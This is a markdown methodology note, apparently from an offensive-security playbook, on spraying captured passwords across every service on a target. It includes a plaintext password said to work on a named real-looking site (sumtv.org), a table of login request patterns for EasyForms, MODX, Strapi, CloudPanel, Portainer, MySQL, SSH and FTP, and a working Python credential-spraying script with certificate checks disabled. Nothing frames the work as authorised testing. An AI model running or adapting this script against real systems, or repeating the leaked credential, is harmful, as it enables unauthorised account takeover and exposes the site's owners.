# Cross-Service Credential Spray

Once any password is captured — from runtime logs, leakradar, niamonx, or brute force —
it MUST be tested against EVERY discovered service before declaring it service-specific.

## Why

Organizations reuse credentials across services. A password found in an EasyForms
error log may also work on MODX, Strapi, CloudPanel, Portainer, MySQL, SSH, or FTP.

On sumtv.org: `ygb6QNV!gjz1vxg_umh` worked on EasyForms but NOT on MODX/Strapi/CloudPanel/
Portainer. The inverse can also happen — a MODX password might unlock EasyForms.

## Spray Checklist

For every valid credential found, test:

| # | Service | Pattern |
|---|---------|---------|
| 1 | EasyForms | POST / with LoginForm[login] + LoginForm[password] + _csrf |
| 2 | MODX | POST /manager/ with username + password + login=1 |
| 3 | Strapi | POST /admin/login with {"email":"...","password":"..."} |
| 4 | CloudPanel | POST /login with userName + password + _csrf_token |
| 5 | Portainer | POST /api/auth with {"username":"...","password":"..."} |
| 6 | MySQL | mysql -h IP -u user -p'password' -e 'SELECT 1' |
| 7 | SSH | ssh user@IP (with sshpass) |
| 8 | FTP | ftp -n IP (USER/PASS) |
| 9 | Any other co-host CMS | Login form POST |

## Python Spray Script Template

```python
import requests, re
requests.packages.urllib3.disable_warnings()

PASS = 'FOUND_PASSWORD'
USERS = ['admin', 'root', 'FOUND_USERNAME']
EMAILS = ['admin@TARGET', 'FOUND_EMAIL']
s = requests.Session(); s.verify = False

# MODX
for u in USERS[:3]:
    r = s.post('https://TARGET/manager/', data={
        'login_context':'mgr','username':u,'password':PASS,'login':'1'
    }, timeout=10)
    if 'Login' not in r.text[:500]:
        print(f'MODX SUCCESS: {u}:{PASS}')

# Strapi
for e in EMAILS[:2]:
    r = s.post('https://api.TARGET/admin/login', json={'email':e,'password':PASS}, timeout=10)
    if 'token' in str(r.json()):
        print(f'Strapi SUCCESS: {e}:{PASS}')

# CloudPanel
r = s.get('https://TARGET:8443/login', timeout=10)
csrf = re.search(r'_csrf_token.*?value="([^"]+)"', r.text)
if csrf:
    for u in ['root','admin']:
        r = s.post('https://TARGET:8443/login', data={
            '_csrf_token':csrf.group(1),'userName':u,'password':PASS
        }, timeout=10)
        if 'Invalid' not in r.text:
            print(f'CloudPanel SUCCESS: {u}:{PASS}')

# Portainer
r = s.post('https://docker.TARGET/api/auth', json={'username':'admin','password':PASS}, timeout=10)
if r.status_code == 200:
    print(f'Portainer SUCCESS: {r.text[:200]}')
```